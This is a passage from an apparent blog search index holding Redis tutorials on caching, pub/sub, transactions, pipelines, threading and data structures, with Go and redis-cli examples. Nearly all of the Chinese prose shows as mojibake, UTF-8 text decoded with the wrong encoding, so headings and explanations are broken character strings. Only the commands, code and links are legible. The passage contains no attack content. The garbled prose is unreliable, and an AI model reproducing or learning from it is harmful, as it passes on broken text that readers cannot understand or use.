è½½åˆ°ç¼“å­˜ä¸­ã€‚è¿™æ ·ï¼Œå½“ç”¨æˆ·è®¿é—®è¿™äº›çƒ­ç‚¹æ•°æ®æ—¶ï¼Œå¯ä»¥ç›´æ¥ä»ç¼“å­˜ä¸­è·å–ï¼Œé¿å…å¯¹åç«¯æ•°æ®åº“é€ æˆå‹åŠ›ã€‚ç¼“å­˜é¢„çƒ­å¯ä»¥é€šè¿‡å®šæ—¶ä»»åŠ¡æˆ–åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶åŠ è½½çƒ­ç‚¹æ•°æ®å®ç°ã€‚\n\n### 4.6 åˆ†åŒºä¸å‡åŒ€\n\nå¯èƒ½åŸå› ï¼šå¤§Keyã€Hash Tagsã€‚\n\n+ å¤§keyã€‚å¯¹keyè¿›è¡Œæ‹†åˆ†ã€‚\n\n-  HashTag æœºåˆ¶ä½¿ç”¨{}å¤§æ‹¬å·ï¼ŒæŒ‡å®škeyåªè®¡ç®—å¤§æ‹¬å·å†…å­—ç¬¦ä¸²çš„å“ˆå¸Œï¼Œä»è€Œå°†ä¸åŒkeyçš„å¥å€¼å¯¹æ’å…¥åˆ°åŒä¸€ä¸ªå“ˆå¸Œæ§½ã€‚\n\n  æ£€æŸ¥ä¸‹ä¸šåŠ¡ä»£ç ï¼Œæœ‰æ²¡æœ‰å¼•å…¥HashTagï¼Œå°†å¤ªå¤šçš„keyè·¯ç”±åˆ°äº†ä¸€ä¸ªå®ä¾‹ã€‚\n\n# 5. å¤´è„‘é£æš´\n\n+ ä¸»ä»å¤åˆ¶æœ‰å…¨é‡å¤åˆ¶å’Œå¢é‡å¤åˆ¶ï¼Œå…¨é‡å°±æ˜¯rdbï¼Œå¢é‡å°±æ˜¯ä¸€ä¸ªç¯å½¢ç¼“å†²åŒºã€‚\n+ å“¨å…µæ˜¯ç‰¹æ®Šçš„rediså‘½ä»¤è¿›è¡Œç›‘æ§ï¼Œå“¨å…µè¦ç»„æˆä¸€ä¸ªé›†ç¾¤ç›‘æ§ä¸»åº“ã€‚é€‰ä¸»å“¨å…µleaderç„¶åä¸»è§‚å’Œå®¢è§‚åˆ¤æ–­æ˜¯å¦ä¸»ä»åˆ‡æ¢ã€‚\n+ Redis cluster é›†ç¾¤æ˜¯åˆ†åŒºçš„æ–¹æ¡ˆï¼Œæ•°æ®å­˜åœ¨å¾ˆå¤šèŠ‚ç‚¹ã€‚æ¯ä¸ªèŠ‚ç‚¹åˆä¼šæœ‰ä¸»ä»å¤åˆ¶ã€‚\n+ ç¼“å­˜ç©¿é€ï¼šå¸ƒéš†è¿‡æ»¤å™¨ã€‚ç¼“å­˜å‡»ç©¿ï¼šé™æµã€‚ç¼“å­˜é›ªå´©ï¼šéšæœºè¿‡æœŸæ—¶é—´ã€‚\n+ å¤§keyè¦å»åšåˆ†å‰²ï¼Œçƒ­keyè¦å»åˆ†ç‰‡æˆ–å†…å­˜é¢„çƒ­ï¼Œåˆ†åŒºä¸å‡åŒ€æ˜¯å¤§keyå’Œhashtagæœºåˆ¶ã€‚\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://www.liuvv.com/p/2aa5fdb4.html\n+ https://www.xiaolincoding.com/redis/cluster/sentinel.html\n+ https://segmentfault.com/a/1190000038771812\n+ https://www.cnblogs.com/jian0110/p/14002555.html\n\n","tags":["redis"],"categories":["redis"]},{"title":"redisè®¢é˜…äº‹åŠ¡ç®¡é“å¤šçº¿ç¨‹ç­‰é«˜çº§ç‰¹æ€§","url":"%2Fp%2Fd6c4a96f.html","content":"\n# 1. å‘å¸ƒè®¢é˜…\n\nRedis çš„ SUBSCRIBE å‘½ä»¤å¯ä»¥è®©å®¢æˆ·ç«¯è®¢é˜…ä»»æ„æ•°é‡çš„é¢‘é“ï¼Œ æ¯å½“æœ‰æ–°ä¿¡æ¯å‘é€åˆ°è¢«è®¢é˜…çš„é¢‘é“æ—¶ï¼Œ ä¿¡æ¯å°±ä¼šè¢«å‘é€ç»™æ‰€æœ‰è®¢é˜…æŒ‡å®šé¢‘é“çš„å®¢æˆ·ç«¯ã€‚\n\nRedisæœ‰ä¸¤ç§å‘å¸ƒ/è®¢é˜…æ¨¡å¼ï¼š\n\n- åŸºäºé¢‘é“(Channel)çš„å‘å¸ƒ/è®¢é˜…\n- åŸºäºæ¨¡å¼(pattern)çš„å‘å¸ƒ/è®¢é˜…\n\n<!-- more -->\n\n### 1.1 åŸºäºé¢‘é“(Channel)çš„å‘å¸ƒ/è®¢é˜…\n\n+ å‘å¸ƒ\n\n```bash\n127.0.0.1:6379> publish channel:1 hi\n(integer) 1\n```\n\n+ è®¢é˜…\n\n```bash\n127.0.0.1:6379> subscribe channel:1\nReading messages... (press Ctrl-C to quit)\n1) \"subscribe\" // æ¶ˆæ¯ç±»å‹\n2) \"channel:1\" // é¢‘é“\n3) \"hi\" // æ¶ˆæ¯å†…å®¹\n```\n\næ‰§è¡Œä¸Šé¢å‘½ä»¤å®¢æˆ·ç«¯ä¼šè¿›å…¥è®¢é˜…çŠ¶æ€ï¼Œå¤„äºæ­¤çŠ¶æ€ä¸‹å®¢æˆ·ç«¯ä¸èƒ½ä½¿ç”¨é™¤`subscribe`ã€`unsubscribe`ã€`psubscribe`å’Œ`punsubscribe`è¿™å››ä¸ªå±äº\"å‘å¸ƒ/è®¢é˜…\"ä¹‹å¤–çš„å‘½ä»¤ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚\n\n\n\n### 1.2 åŸºäºæ¨¡å¼(pattern)çš„å‘å¸ƒ/è®¢é˜…\n\n<img src=\"redisè®¢é˜…äº‹åŠ¡ç®¡é“å¤šçº¿ç¨‹ç­‰é«˜çº§ç‰¹æ€§/image-20230830202605843.png\" alt=\"image-20230830202605843\" style=\"zoom:50%;\" />\n\nå½“æœ‰ä¿¡æ¯å‘é€åˆ° tweet.shop.kindle é¢‘é“æ—¶ï¼Œ ä¿¡æ¯é™¤äº†å‘é€ç»™ clientX å’Œ clientY ä¹‹å¤–ï¼Œ è¿˜ä¼šå‘é€ç»™è®¢é˜… tweet.shop.* æ¨¡å¼çš„ client123 å’Œ client256 \n\n```bash\n127.0.0.1:6379> psubscribe c? b* d?*\nReading messages... (press Ctrl-C to quit)\n```\n\n# 2. äº‹åŠ¡\n\nRedisäº‹åŠ¡å°±æ˜¯ä¸€æ¬¡æ€§ã€é¡ºåºæ€§ã€æ’ä»–æ€§çš„æ‰§è¡Œä¸€ä¸ªé˜Ÿåˆ—ä¸­çš„ä¸€ç³»åˆ—å‘½ä»¤ã€‚å‡†ç¡®çš„è®²ï¼ŒRedis äº‹åŠ¡åŒ…å«ä¸¤ç§æ¨¡å¼ : äº‹åŠ¡æ¨¡å¼ å’Œ Lua è„šæœ¬ã€‚\n\n### 2.1 äº‹åŠ¡çš„ä½¿ç”¨\n\n- MULTI ï¼šå¼€å¯äº‹åŠ¡ï¼Œredisä¼šå°†åç»­çš„å‘½ä»¤é€ä¸ªæ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œç„¶åä½¿ç”¨EXECå‘½ä»¤æ¥åŸå­åŒ–æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ç³»åˆ—ã€‚\n- EXECï¼šæ‰§è¡Œäº‹åŠ¡ä¸­çš„æ‰€æœ‰æ“ä½œå‘½ä»¤ã€‚\n- DISCARDï¼šå–æ¶ˆäº‹åŠ¡ï¼Œæ”¾å¼ƒæ‰§è¡Œäº‹åŠ¡å—ä¸­çš„æ‰€æœ‰å‘½ä»¤ã€‚\n- WATCHï¼šç›‘è§†ä¸€ä¸ªæˆ–å¤šä¸ªkey,å¦‚æœäº‹åŠ¡åœ¨æ‰§è¡Œå‰ï¼Œè¿™ä¸ªkey(æˆ–å¤šä¸ªkey)è¢«å…¶ä»–å‘½ä»¤ä¿®æ”¹ï¼Œåˆ™äº‹åŠ¡è¢«ä¸­æ–­ï¼Œä¸ä¼šæ‰§è¡Œäº‹åŠ¡ä¸­çš„ä»»ä½•å‘½ä»¤ã€‚\n- UNWATCHï¼šå–æ¶ˆWATCHå¯¹æ‰€æœ‰keyçš„ç›‘è§†ã€‚\n\n```bash\n127.0.0.1:6379> set k1 v1\nOK\n127.0.0.1:6379> set k2 v2\nOK\n127.0.0.1:6379> MULTI\nOK\n127.0.0.1:6379> set k1 11\nQUEUED\n127.0.0.1:6379> set k2 22\nQUEUED\n127.0.0.1:6379> EXEC\n1) OK\n2) OK\n127.0.0.1:6379> get k1\n\"11\"\n127.0.0.1:6379> get k2\n\"22\"\n127.0.0.1:6379>\n```\n\n### 2.2 äº‹åŠ¡é”™è¯¯å¤„ç†\n\n+ è¯­æ³•é”™è¯¯ï¼ˆç¼–è¯‘å™¨é”™è¯¯ï¼‰ï¼Œå¼€å¯äº‹åŠ¡åï¼Œä¿®æ”¹k1å€¼ä¸º11ï¼Œk2å€¼ä¸º22ï¼Œä½†k2è¯­æ³•é”™è¯¯ï¼Œæœ€ç»ˆå¯¼è‡´äº‹åŠ¡æäº¤å¤±è´¥ï¼Œk1ã€k2ä¿ç•™åŸå€¼ã€‚\n+ Redisç±»å‹é”™è¯¯ï¼ˆè¿è¡Œæ—¶é”™è¯¯ï¼‰ï¼Œå¼€å¯äº‹åŠ¡åï¼Œä¿®æ”¹k1å€¼ä¸º11ï¼Œk2å€¼ä¸º22ï¼Œä½†å°†k2çš„ç±»å‹ä½œä¸ºListï¼Œåœ¨è¿è¡Œæ—¶æ£€æµ‹ç±»å‹é”™è¯¯ï¼Œæœ€ç»ˆå¯¼è‡´äº‹åŠ¡æäº¤å¤±è´¥ï¼Œæ­¤æ—¶äº‹åŠ¡å¹¶æ²¡æœ‰å›æ»šï¼Œè€Œæ˜¯è·³è¿‡é”™è¯¯å‘½ä»¤ç»§ç»­æ‰§è¡Œï¼Œ ç»“æœk1å€¼æ”¹å˜ã€k2ä¿ç•™åŸå€¼ã€‚\n\n1. å‘½ä»¤å…¥é˜Ÿæ—¶æŠ¥é”™ï¼Œ ä¼šæ”¾å¼ƒäº‹åŠ¡æ‰§è¡Œï¼Œä¿è¯åŸå­æ€§ï¼ˆå›æ»šï¼‰ã€‚\n2. å‘½ä»¤å…¥é˜Ÿæ—¶æ­£å¸¸ï¼Œæ‰§è¡Œ EXEC å‘½ä»¤åæŠ¥é”™ï¼Œä¸ä¿è¯åŸå­æ€§(ä¸å›æ»š)ã€‚\n\n### 2.3  Redis çš„ ACID\n\n- **åŸå­æ€§atomicity**\n\né¦–å…ˆé€šè¿‡ä¸Šæ–‡çŸ¥é“ è¿è¡ŒæœŸçš„é”™è¯¯æ˜¯ä¸ä¼šå›æ»šçš„ï¼Œå¾ˆå¤šæ–‡ç« ç”±æ­¤è¯´Redisäº‹åŠ¡è¿èƒŒåŸå­æ€§çš„ï¼›è€Œå®˜æ–¹æ–‡æ¡£è®¤ä¸ºæ˜¯éµä»åŸå­æ€§çš„ã€‚\n\nRediså®˜æ–¹æ–‡æ¡£ç»™çš„ç†è§£æ˜¯ï¼Œ**Redisçš„äº‹åŠ¡æ˜¯åŸå­æ€§çš„ï¼šæ‰€æœ‰çš„å‘½ä»¤ï¼Œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆå…¨éƒ¨ä¸æ‰§è¡Œ**ã€‚è€Œä¸æ˜¯å®Œå…¨æˆåŠŸã€‚\n\n- **ä¸€è‡´æ€§consistency**\n\nredisäº‹åŠ¡å¯ä»¥ä¿è¯å‘½ä»¤å¤±è´¥çš„æƒ…å†µä¸‹å¾—ä»¥å›æ»šï¼Œæ•°æ®èƒ½æ¢å¤åˆ°æ²¡æœ‰æ‰§è¡Œä¹‹å‰çš„æ ·å­ï¼Œæ˜¯ä¿è¯ä¸€è‡´æ€§çš„ï¼Œé™¤éredisè¿›ç¨‹æ„å¤–ç»ˆç»“ã€‚\n\n- **éš”ç¦»æ€§Isolation**\n\nredisäº‹åŠ¡æ˜¯ä¸¥æ ¼éµå®ˆéš”ç¦»æ€§çš„ï¼ŒåŸå› æ˜¯redisæ˜¯å•è¿›ç¨‹å•çº¿ç¨‹æ¨¡å¼(v6.0ä¹‹å‰ï¼‰ï¼Œå¯ä»¥ä¿è¯å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šè¢«å…¶ä»–å®¢æˆ·ç«¯å‘½ä»¤æ‰“æ–­ã€‚\n\nä½†æ˜¯ï¼ŒRedisä¸åƒå…¶å®ƒç»“æ„åŒ–æ•°æ®åº“æœ‰éš”ç¦»çº§åˆ«è¿™ç§è®¾è®¡ã€‚\n\n- **æŒä¹…æ€§Durability**\n\n**redisäº‹åŠ¡æ˜¯ä¸ä¿è¯æŒä¹…æ€§çš„**ï¼Œè¿™æ˜¯å› ä¸ºredisæŒä¹…åŒ–ç­–ç•¥ä¸­ä¸ç®¡æ˜¯RDBè¿˜æ˜¯AOFéƒ½æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œä¸ä¿è¯æŒä¹…æ€§æ˜¯å‡ºäºå¯¹æ€§èƒ½çš„è€ƒè™‘ã€‚\n\n\n\n### 2.4  åˆ†å¸ƒå¼é”èƒ½ç”¨äº‹åŠ¡å—\n\n`setnx`å’Œ`expire`æ˜¯ä¸¤æ¡æŒ‡ä»¤è€Œä¸æ˜¯åŸå­æŒ‡ä»¤ã€‚å¦‚æœè¿™ä¸¤æ¡æŒ‡ä»¤å¯ä»¥ä¸€èµ·æ‰§è¡Œå°±ä¸ä¼šå‡ºç°é—®é¢˜ã€‚\n\nä¹Ÿè®¸ä½ ä¼šæƒ³åˆ°ç”¨Redisäº‹åŠ¡æ¥è§£å†³ã€‚ä½†æ˜¯è¿™é‡Œä¸è¡Œï¼Œå› ä¸ºexpireæ˜¯ä¾èµ–äºsetnxçš„æ‰§è¡Œç»“æœçš„ï¼Œå¦‚æœsetnxçš„æ‰§è¡Œç»“æœçš„ï¼Œå¦‚æœsetnxæ²¡æŠ¢åˆ°é”ï¼Œexpireæ˜¯ä¸åº”è¯¥æ‰§è¡Œçš„ã€‚redisäº‹åŠ¡é‡Œæ²¡æœ‰if-elseåˆ†æ”¯é€»è¾‘ï¼Œäº‹åŠ¡çš„ç‰¹ç‚¹æ˜¯ä¸€å£æ°”æ‰§è¡Œï¼Œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œè¦ä¹ˆä¸€ä¸ªéƒ½ä¸æ‰§è¡Œã€‚\n\n\n\nRedis2.8ç‰ˆæœ¬ä¸­ä½œè€…åŠ å…¥äº†`set`æŒ‡ä»¤çš„æ‰©å±•å‚æ•°ï¼Œä½¿å¾—`setnx`å’Œ`expire`ç»„åˆåœ¨ä¸€èµ·çš„åŸå­æŒ‡ä»¤ä¸€èµ·æ‰§è¡Œï¼Œå®ƒå°±æ˜¯redisåˆ†å¸ƒå¼é”çš„åŸç†; \n\n```bash\nSET key uuid NX EX seconds\n```\n\n\n\n# 3. ç®¡é“ Pipeline\n\n+ redisçš„ç®¡é“å‘½ä»¤ï¼Œå…è®¸clientå°†å¤šä¸ªè¯·æ±‚ä¾æ¬¡å‘ç»™æœåŠ¡å™¨ï¼Œè¿‡ç¨‹ä¸­è€Œä¸éœ€è¦ç­‰å¾…è¯·æ±‚çš„å›å¤ï¼Œåœ¨æœ€åå†ä¸€å¹¶è¯»å–ç»“æœå³å¯ã€‚\n\n+ pipelineä¸ä¿è¯åŸå­æ€§ã€‚\n\n```go\npackage main\n\nimport (\n    \"github.com/go-redis/redis\"\n    \"fmt\"\n)\n\nfunc main() {\n    client := redis.NewClusterClient(&redis.ClusterOptions{\n        Addrs: []string{\"192.168.120.110:6379\"},\n        ReadOnly: true,\n        RouteRandomly: true,\n    })\n\n    pipe := client.Pipeline()\n    pipe.HGetAll(\"1\")\n    pipe.HGetAll(\"2\")\n    pipe.HGetAll(\"3\")\n    cmders, err := pipe.Exec()\n    if err != nil {\n        fmt.Println(\"err\", err)\n    }\n    for _, cmder := range cmders {\n        cmd := cmder.(*redis.StringStringMapCmd)\n        strMap, err := cmd.Result()\n        if err != nil {\n            fmt.Println(\"err\", err)\n        }\n        fmt.Println(\"strMap\", strMap)\n    }\n}\n```\n\n# 4. å¤šçº¿ç¨‹\n\næˆ‘ä»¬æ‰€è¯´çš„Rediså•çº¿ç¨‹ï¼ŒæŒ‡çš„æ˜¯\"å…¶ç½‘ç»œIOå’Œé”®å€¼å¯¹è¯»å†™æ˜¯ç”±ä¸€ä¸ªçº¿ç¨‹å®Œæˆçš„\"ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒRedisä¸­åªæœ‰ç½‘ç»œè¯·æ±‚æ¨¡å—å’Œæ•°æ®æ“ä½œæ¨¡å—æ˜¯å•çº¿ç¨‹çš„ã€‚è€Œå…¶ä»–çš„å¦‚æŒä¹…åŒ–å­˜å‚¨æ¨¡å—ã€é›†ç¾¤æ”¯æ’‘æ¨¡å—ç­‰æ˜¯å¤šçº¿ç¨‹çš„ã€‚\n\n### 4.1 ä¸ºä»€ä¹ˆç”¨å•çº¿ç¨‹\n\næ‰€ä»¥è¯´ï¼ŒRedisä¸­å¹¶ä¸æ˜¯æ²¡æœ‰å¤šçº¿ç¨‹æ¨¡å‹çš„ï¼Œæ—©åœ¨Redis 4.0çš„æ—¶å€™å°±å·²ç»é’ˆå¯¹éƒ¨åˆ†å‘½ä»¤åšäº†å¤šçº¿ç¨‹åŒ–ã€‚\n\n1ã€Redis æ“ä½œåŸºäºå†…å­˜ï¼Œç»å¤§å¤šæ•°æ“ä½œçš„æ€§èƒ½ç“¶é¢ˆä¸åœ¨ CPUã€‚\n2ã€ä½¿ç”¨å•çº¿ç¨‹æ¨¡å‹ï¼Œå¯ç»´æŠ¤æ€§æ›´é«˜ï¼Œå¼€å‘ï¼Œè°ƒè¯•å’Œç»´æŠ¤çš„æˆæœ¬æ›´ä½ã€‚\n3ã€å•çº¿ç¨‹æ¨¡å‹ï¼Œé¿å…äº†çº¿ç¨‹é—´åˆ‡æ¢å¸¦æ¥çš„æ€§èƒ½å¼€é”€ã€‚\n4ã€åœ¨å•çº¿ç¨‹ä¸­ä½¿ç”¨å¤šè·¯å¤ç”¨ I/OæŠ€æœ¯ä¹Ÿèƒ½æå‡Redisçš„I/Oåˆ©ç”¨ç‡ã€‚\n\n### 4.2 Redis 6.0çš„å¤šçº¿ç¨‹\n\nRedis 6.0é‡‡ç”¨å¤šä¸ªIOçº¿ç¨‹æ¥å¤„ç†ç½‘ç»œè¯·æ±‚ï¼Œç½‘ç»œè¯·æ±‚çš„è§£æå¯ä»¥ç”±å…¶ä»–çº¿ç¨‹å®Œæˆï¼Œç„¶åæŠŠè§£æåçš„è¯·æ±‚äº¤ç”±ä¸»çº¿ç¨‹è¿›è¡Œå®é™…çš„å†…å­˜è¯»å†™ã€‚æå‡ç½‘ç»œè¯·æ±‚å¤„ç†çš„å¹¶è¡Œåº¦ï¼Œè¿›è€Œæå‡æ•´ä½“æ€§èƒ½ã€‚\n\nä½†æ˜¯ï¼ŒRedis çš„å¤š IO çº¿ç¨‹åªæ˜¯ç”¨æ¥å¤„ç†ç½‘ç»œè¯·æ±‚çš„ï¼Œå¯¹äºè¯»å†™å‘½ä»¤ï¼ŒRedis ä»ç„¶ä½¿ç”¨å•çº¿ç¨‹æ¥å¤„ç†ã€‚\n\n<img src=\"redisè®¢é˜…äº‹åŠ¡ç®¡é“å¤šçº¿ç¨‹ç­‰é«˜çº§ç‰¹æ€§/1.png\" alt=\"Redis6.0å¤šçº¿ç¨‹\" style=\"zoom:70%;\" />\n\n# 5. äº‹ä»¶é©±åŠ¨\n\nRedis é‡‡ç”¨äº‹ä»¶é©±åŠ¨æœºåˆ¶æ¥å¤„ç†å¤§é‡çš„ç½‘ç»œIOã€‚å®ƒå¹¶æ²¡æœ‰ä½¿ç”¨ libevent æˆ–è€… libev è¿™æ ·çš„æˆç†Ÿå¼€æºæ–¹æ¡ˆï¼Œè€Œæ˜¯è‡ªå·±å®ç°ä¸€ä¸ªéå¸¸ç®€æ´çš„äº‹ä»¶é©±åŠ¨åº“ ae_eventã€‚\n\n### 5.1 æ–‡ä»¶äº‹ä»¶\n\næ–‡ä»¶äº‹ä»¶å…¶å®å°±æ˜¯å¯¹Socketæ“ä½œçš„æŠ½è±¡ï¼ŒRedisæœåŠ¡å™¨ä¸Rediså®¢æˆ·ç«¯çš„é€šä¿¡ä¼šäº§ç”Ÿæ–‡ä»¶äº‹ä»¶ï¼ŒæœåŠ¡å™¨é€šè¿‡ç›‘å¬å¹¶å¤„ç†è¿™äº›äº‹ä»¶æ¥å®Œæˆä¸€ç³»åˆ—çš„ç½‘ç»œæ“ä½œã€‚\n\næ–‡ä»¶äº‹ä»¶å¤„ç†å™¨ä½¿ç”¨I/Oå¤šè·¯å¤ç”¨ï¼ˆepollï¼‰ç¨‹åºæ¥åŒæ—¶ç›‘å¬å¤šä¸ªSocketã€‚epoll ä¸€æ—¦ç›‘æµ‹åˆ° FD ä¸Šæœ‰è¯·æ±‚åˆ°è¾¾æ—¶ï¼Œå°±ä¼šè§¦å‘ç›¸åº”çš„äº‹ä»¶ã€‚è¿™äº›äº‹ä»¶ä¼šè¢«æ”¾è¿›ä¸€ä¸ªäº‹ä»¶é˜Ÿåˆ—ï¼ŒRedis å•çº¿ç¨‹å¯¹è¯¥äº‹ä»¶é˜Ÿåˆ—ä¸æ–­è¿›è¡Œå¤„ç†ã€‚\n\nRedis åœ¨å¯¹äº‹ä»¶é˜Ÿåˆ—ä¸­çš„äº‹ä»¶è¿›è¡Œå¤„ç†æ—¶ï¼Œä¼šè°ƒç”¨ç›¸åº”çš„å¤„ç†å‡½æ•°ï¼Œè¿™å°±å®ç°äº†åŸºäºäº‹ä»¶çš„å›è°ƒã€‚å› ä¸º Redis ä¸€ç›´åœ¨å¯¹äº‹ä»¶é˜Ÿåˆ—è¿›è¡Œå¤„ç†ï¼Œæ‰€ä»¥èƒ½åŠæ—¶å“åº”å®¢æˆ·ç«¯è¯·æ±‚ï¼Œæå‡ Redis çš„å“åº”æ€§èƒ½ã€‚\n\n### 5.2 æ—¶é—´äº‹ä»¶\n\n- å®šæ—¶äº‹ä»¶ï¼šè®©ä¸€æ®µç¨‹åºåœ¨æŒ‡å®šçš„æ—¶é—´ä¹‹åæ‰§è¡Œä¸€æ¬¡ã€‚\n- å‘¨æœŸæ€§äº‹ä»¶ï¼šè®©ä¸€æ®µç¨‹åºæ¯éš”æŒ‡å®šæ—¶é—´å°±æ‰§è¡Œä¸€æ¬¡ã€‚\n\næœåŠ¡å™¨æ‰€æœ‰çš„æ—¶é—´äº‹ä»¶éƒ½æ”¾åœ¨ä¸€ä¸ªæ— åºé“¾è¡¨ä¸­ï¼Œæ¯å½“æ—¶é—´äº‹ä»¶æ‰§è¡Œå™¨è¿è¡Œæ—¶ï¼Œå®ƒå°±éå†æ•´ä¸ªé“¾è¡¨ï¼ŒæŸ¥æ‰¾æ‰€æœ‰å·²åˆ°è¾¾çš„æ—¶é—´äº‹ä»¶ï¼Œå¹¶è°ƒç”¨ç›¸åº”çš„äº‹ä»¶å¤„ç†å™¨ã€‚æ­£å¸¸æ¨¡å¼ä¸‹çš„RedisæœåŠ¡å™¨åªä½¿ç”¨serverCronä¸€ä¸ªæ—¶é—´äº‹ä»¶ï¼Œè€Œåœ¨benchmarkæ¨¡å¼ä¸‹ï¼ŒæœåŠ¡å™¨ä¹Ÿåªä½¿ç”¨ä¸¤ä¸ªæ—¶é—´äº‹ä»¶ï¼Œæ‰€ä»¥ä¸å½±å“äº‹ä»¶æ‰§è¡Œçš„æ€§èƒ½ã€‚\n\nå®ƒçš„ä¸»è¦å·¥ä½œåŒ…æ‹¬ï¼š\n\n- æ›´æ–°æœåŠ¡å™¨çš„ç»Ÿè®¡ä¿¡æ¯(æ—¶é—´ã€å†…å­˜å ç”¨ã€æ•°æ®åº“å ç”¨)\n- æ¸…ç†æ•°æ®åº“çš„è¿‡æœŸé”®å€¼å¯¹\n- AOFã€RDBæŒä¹…åŒ–\n- å¦‚æœæ˜¯ä¸»ä»æœåŠ¡å™¨ï¼Œå¯¹ä»æœåŠ¡å™¨è¿›è¡Œå®šæœŸåŒæ­¥\n- å¦‚æœæ˜¯é›†ç¾¤æ¨¡å¼ï¼Œå¯¹è¿›ç¾¤è¿›è¡Œå®šæœŸåŒæ­¥å’Œè¿æ¥\n\n# 6. å¤´è„‘é£æš´\n\n+ redisäº‹åŠ¡æœ‰å‘½ä»¤å’Œluaæ¨¡å¼ï¼ŒåŸå­æ˜¯å…¨éƒ¨æ‰§è¡Œæˆ–å…¨éƒ¨ä¸æ‰§è¡Œï¼Œå¹¶ä¸ä¸€å®šä¿è¯æˆåŠŸã€‚\n+ å¤šçº¿ç¨‹åªæ˜¯å¤„ç†ç½‘ç»œè¯·æ±‚ï¼Œredisè¯»å†™è¿˜æ˜¯å•çº¿ç¨‹ã€‚\n+ æ–‡ä»¶äº‹ä»¶æ˜¯ç”¨epollç›‘å¬æ–‡ä»¶æè¿°ç¬¦ã€‚æ—¶é—´äº‹ä»¶æ˜¯åšæŒä¹…åŒ–ï¼Œæ¸…é™¤keyï¼Œä¸»ä»åŒæ­¥ç­‰ã€‚\n\n# 7. å‚è€ƒèµ„æ–™\n\n+ https://github.com/ZhongFuCheng3y/3y#tvredis\n+ https://www.pdai.tech/md/db/nosql-redis/db-redis-x-trans.html\n\n","tags":["redis"],"categories":["redis"]},{"title":"redisæ•°æ®ç»“æ„å’ŒæŒä¹…åŒ–","url":"%2Fp%2F2a86dce.html","content":"\n# 1. åŸºç¡€å¯¹è±¡\n\nRedisçš„å­˜å‚¨æ˜¯ä»¥`key-value`çš„å½¢å¼çš„ã€‚Redisä¸­çš„keyä¸€å®šæ˜¯å­—ç¬¦ä¸²ï¼Œvalueå¯ä»¥æ˜¯stringã€listã€hashã€setã€sortsetè¿™å‡ ç§å¸¸ç”¨çš„ã€‚\n\n| ç±»å‹    | ä½œç”¨                                               | åº•å±‚æ•°æ®ç»“æ„          |\n| ------- | -------------------------------------------------- | --------------------- |\n| string  | ç®€å•çš„key-value                                    | int, embstr(sds), raw |\n| list    | æœ‰åºåˆ—è¡¨,å¯åšç®€å•é˜Ÿåˆ—                              | å‹ç¼©åˆ—è¡¨,åŒå‘é“¾è¡¨     |\n| hash    | å“ˆå¸Œè¡¨, å­˜å‚¨ç»“æ„åŒ–æ•°æ®                             | å‹ç¼©åˆ—è¡¨,å“ˆå¸Œ table   |\n| set     | æ— åºåˆ—è¡¨(å»é‡), æä¾›ä¸€ç³»åˆ—çš„äº¤é›†ã€å¹¶é›†ã€å·®é›†çš„å‘½ä»¤ | æ•´æ•°é›†åˆ,å“ˆå¸Œ table   |\n| sortset | æœ‰åºé›†åˆæ˜ å°„, æ’è¡Œæ¦œ                               | å‹ç¼©åˆ—è¡¨, è·³è·ƒè¡¨      |\n\n<!-- more -->\n\n### 1.1 string\n\n+ int ç¼–ç ï¼šä¿å­˜çš„æ˜¯å¯ä»¥ç”¨ long ç±»å‹è¡¨ç¤ºçš„æ•´æ•°å€¼ã€‚\n\n+ embstr ç¼–ç ï¼šä¿å­˜é•¿åº¦å°äº44å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼ˆredis3.2ç‰ˆæœ¬ä¹‹å‰æ˜¯39å­—èŠ‚ï¼Œä¹‹åæ˜¯44å­—èŠ‚ï¼‰ã€‚\n\n+ raw ç¼–ç ï¼šä¿å­˜é•¿åº¦å¤§äº44å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼ˆredis3.2ç‰ˆæœ¬ä¹‹å‰æ˜¯39å­—èŠ‚ï¼Œä¹‹åæ˜¯44å­—èŠ‚ï¼‰\n\n**ä½¿ç”¨åœºæ™¯**\n\n- ç¼“å­˜ï¼š ç»å…¸ä½¿ç”¨åœºæ™¯ï¼ŒæŠŠå¸¸ç”¨ä¿¡æ¯ï¼Œå­—ç¬¦ä¸²ï¼Œå›¾ç‰‡æˆ–è€…è§†é¢‘ç­‰ä¿¡æ¯æ”¾åˆ°redisä¸­ï¼Œredisä½œä¸ºç¼“å­˜å±‚ï¼ŒmysqlåšæŒä¹…åŒ–å±‚ï¼Œé™ä½mysqlçš„è¯»å†™å‹åŠ›ã€‚\n- è®¡æ•°å™¨ï¼šredisæ˜¯å•çº¿ç¨‹æ¨¡å‹ï¼Œä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå®Œæ‰ä¼šæ‰§è¡Œä¸‹ä¸€ä¸ªï¼ŒåŒæ—¶æ•°æ®å¯ä»¥ä¸€æ­¥è½åœ°åˆ°å…¶ä»–çš„æ•°æ®æºã€‚\n- sessionï¼šå¸¸è§æ–¹æ¡ˆspring session + rediså®ç°sessionå…±äº«ï¼Œ\n\n\n\n### 1.2 list\n\nåˆ—è¡¨å¯¹è±¡çš„ç¼–ç å¯ä»¥æ˜¯ ziplist æˆ–è€… linkedlistã€‚æ–°ç‰ˆæœ¬åˆ—è¡¨å¯¹è±¡çš„ç¼–ç æ˜¯quicklistã€‚ \n\n**ä½¿ç”¨æŠ€å·§**\n\nlpush+lpop=Stack(æ ˆ)\n\nlpush+rpop=Queueï¼ˆé˜Ÿåˆ—ï¼‰\n\nlpush+ltrim=Capped Collectionï¼ˆæœ‰é™é›†åˆï¼‰\n\nlpush+brpop=Message Queueï¼ˆæ¶ˆæ¯é˜Ÿåˆ—ï¼‰\n\n**ä½¿ç”¨åœºæ™¯**\n\n- å¾®åšTimeLine: æœ‰äººå‘å¸ƒå¾®åšï¼Œç”¨lpushåŠ å…¥æ—¶é—´è½´ï¼Œå±•ç¤ºæ–°çš„åˆ—è¡¨ä¿¡æ¯ã€‚\n- 